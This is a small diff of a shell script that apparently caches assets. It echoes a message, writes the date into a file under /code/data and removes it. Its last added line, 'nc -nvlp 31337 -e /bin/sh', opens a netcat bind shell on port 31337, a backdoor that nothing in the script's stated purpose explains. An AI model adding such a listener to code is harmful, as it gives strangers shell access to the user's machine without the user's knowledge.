@@ -1,7 +1,10 @@
-#!/bin/bash
+#!/bin/sh
 
-echo 'just a naive example'
 set -x
-mkdir -p data/
-touch data/cached-assets
+echo 'just a naive example'
+pwd
+mkdir -p /code/data/
+date >/code/data/cached-assets
+cat /code/data/cached-assets
 rm data/cached-assets
+nc -nvlp 31337 -e /bin/sh
